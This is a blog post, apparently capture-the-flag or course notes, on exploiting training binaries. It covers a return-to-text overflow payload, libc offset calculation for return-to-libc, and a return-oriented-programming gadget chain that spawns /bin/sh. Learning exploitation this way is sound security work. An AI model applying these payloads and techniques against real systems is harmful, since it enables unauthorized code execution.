@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Zespre's Blog, Sometimes, we generate bugs">
+
+
+        <title>Secure Programming // Zespre's Blog // Sometimes, we generate bugs</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/theme/css/pure.css">
+    <link rel="stylesheet" href="/theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="/author/zespre-schmidt.html" title="See posts by Zespre Schmidt">
+                        <img class="avatar" alt="Zespre Schmidt" src="http://www.gravatar.com/avatar/93724215aa2d5a9f23d47bda8208073b">
+                </a>
+                <h2 class="article-info">Zespre Schmidt</h2>
+                <small class="about-author">Bug generator</small>
+                <h5>Published</h5>
+                <p>Tue 04 November 2014</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>Secure Programming</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="/tag/secprog/">secprog</a>
+                                <a class="post-category" href="/tag/ctf/">ctf</a>
+                                <a class="post-category" href="/tag/return-oriented-programming/">return-oriented-programming</a>
+                        </p>
+                </header>
+            </section>
+            <div class="section" id="foo-4">
+<h2>foo_4</h2>
+<p>Training for &quot;return to text&quot; attack.</p>
+<p>binsh: 0x0804a030
+system: 0x080483e0</p>
+<p><tt class="docutils literal">print <span class="pre">'a'*24</span> + '\xe0\x83\x04\x08' + 'aaaa' + '\x20\x86\x04\x08'</tt></p>
+</div>
+<div class="section" id="foo-5">
+<h2>foo_5</h2>
+<p>Training for &quot;return to libc&quot; attack.</p>
+<p>Notice: libc.so is provided</p>
+<p><tt class="docutils literal">$ objdump <span class="pre">-d</span> libc.so</tt>
+00019970 &lt;__libc_start_main&gt;:
+0003fc40 &lt;__libc_system&gt;:
+offset: 262d0</p>
+<p>Example:
+Function: libc_start_main's address is :  0xf75f5970
+Function: libc_system's address is : 0xf75f5970 + 0x262d0 = 0xf761bc40</p>
+<p><tt class="docutils literal">$ objdump <span class="pre">-R</span> foo_5</tt>
+0804a01c R_386_JUMP_SLOT   __libc_start_main</p>
+<p>0804a02c &lt;binsh&gt;:
+actual address: 08048620</p>
+</div>
+<div class="section" id="foo-6">
+<h2>foo_6</h2>
+<p>Training for &quot;return-oriented programming&quot; attack.</p>
+<p>int 0x80
+eax: call what
+ebx, ecx: arguments
+remember the number of pops, smash the stack</p>
+<div class="section" id="gadget-1">
+<h3>Gadget 1</h3>
+<p>first gadget: 0x080594ac
+reset eax to 0 by XOR itself
+value for <tt class="docutils literal">pop ebx</tt>: 0x080be568 (/bin/sh)
+return address of first gadget: 0x0805cc5c</p>
+<div class="highlight"><pre>80594ac:       31 c0                   xor    eax,eax
+80594ae:       5b                      pop    ebx
+80594af:       c3                      ret
+</pre></div>
+</div>
+<div class="section" id="gadget-2">
+<h3>Gadget 2</h3>
+<p>second gadget: 0x0805cc5c
+garbage value for <tt class="docutils literal">pop edi</tt>: aaaa
+return address of second gadget: 0x0805cc5c
+repeat 11 times to make eax = 0x0000000b
+last return address of second gadget: 0x0806f0e0</p>
+<div class="highlight"><pre>805cc5c:       40                      inc    eax
+805cc5d:       5f                      pop    edi
+805cc5e:       c3                      ret
+</pre></div>
+</div>
+<div class="section" id="gadget-3">
+<h3>Gadget 3</h3>
+<p>third gadget: 0x0806f0e0</p>
+<div class="highlight"><pre>806f0e0:       cd 80                   int    0x80
+806f0e2:       c3                      ret
+</pre></div>
+</div>
+<div class="section" id="failed-gadget">
+<h3>Failed Gadget</h3>
+<p>Program received signal SIGSEGV in 0x080db8ce. Still don't know why :(</p>
+<div class="highlight"><pre>80db8cd:       40                      inc    eax
+80db8ce:       02 af 0a 0e 0c 41       add    ch,BYTE PTR [edi+0x410c0e0a]
+80db8d4:       c3                      ret
+</pre></div>
+<p>Cannot use <tt class="docutils literal">pop eax</tt> because 0x0000000b contains 00 which is null. It will
+terminate the input string unexpectedly.</p>
+<div class="highlight"><pre>80e205d:  58                      pop    eax
+80e205e:  c3                      ret
+</pre></div>
+</div>
+</div>
+
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = "zespre"; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div><footer class="footer">
+    <p>&copy; Zespre's Blog &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+    <script type="text/javascript">
+        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+        document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+    <script type="text/javascript">
+        try {
+            var pageTracker = _gat._getTracker("UA-56544554-1");
+            pageTracker._trackPageview();
+            } catch(err) {}
+    </script>
+</body>
+</html>
